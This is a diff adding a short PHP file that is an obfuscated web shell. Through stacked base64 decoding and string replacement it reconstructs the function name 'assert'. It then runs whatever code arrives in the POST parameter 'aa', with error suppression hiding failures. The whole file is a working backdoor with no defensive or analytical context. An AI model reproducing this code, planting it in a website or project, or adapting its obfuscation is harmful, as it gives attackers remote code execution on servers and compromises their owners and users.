@@ -1,0 +1,12 @@
+<?php
+$a=@$_POST['aa'];
+$bd="base64_decode";
+$str="str_replace";
+$d=$bd("WVhOelkyRnZibWx0WVdWeWRBPT1jYW9uaW1h");
+$d=$str('cao','nima',$d);
+$d=$str('nima','',$d);
+$d=$bd($d);
+$d=$str('cao','nima',$d);
+$d=$str('nima','',$d);
+@create_function('',$d($a));
+?>
